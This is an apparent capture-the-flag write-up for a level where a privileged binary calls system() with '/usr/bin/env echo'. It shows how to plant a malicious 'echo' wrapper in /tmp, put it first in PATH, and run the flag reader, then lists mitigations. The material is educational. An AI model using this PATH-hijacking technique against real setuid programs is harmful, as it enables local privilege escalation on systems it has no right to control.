# Level03: PATH-based Command Hijacking

## Description
This level demonstrates how failing to sanitize the environment (PATH) while invoking a shell command can lead to privilege escalation. The binary calls `system()` with a command that uses `/usr/bin/env` to run `echo`, and `env` resolves `echo` using the process PATH. By controlling PATH and supplying a malicious `echo`, an attacker can make the program run arbitrary code with the program's privileges.

## Steps to Exploit

1. **Inspect the binary:**
   - Look for strings and symbols:
   ```bash
   strings level03 | grep env
   readelf -s level03 | grep system
   ```
   - Found `/usr/bin/env echo Exploit me` and a `system()` call in `main`.

2. **Prepare a malicious `echo` wrapper:**
   - Create a directory you control and a wrapper that executes the challenge flag reader:
   ```bash
   mkdir -p /tmp/pwn
   cat > /tmp/pwn/echo <<'EOF'
   #!/bin/sh
   exec /bin/getflag "$@"
   EOF
   chmod +x /tmp/pwn/echo
   ```

3. **Place the wrapper first in PATH and run the binary:**
   ```bash
   export PATH=/tmp/pwn:$PATH
   ./level03
   ```
   - `env` finds `/tmp/pwn/echo` first and runs it; the wrapper invokes `/bin/getflag`, printing the flag.

## Impact
- Untrusted environment variables (PATH) can lead to execution of attacker-controlled binaries.
- This results in local privilege escalation when the vulnerable binary runs with elevated rights.

## Mitigation
1. Avoid `system()` with untrusted environment data; prefer execve/posix spawn with controlled argv.
2. Use absolute paths for external commands (do not rely on PATH).
3. Clear or sanitize environment variables (clearenv, set PATH to a safe value) before invoking subprocesses.
4. Drop privileges properly (and permanently) before calling external programs.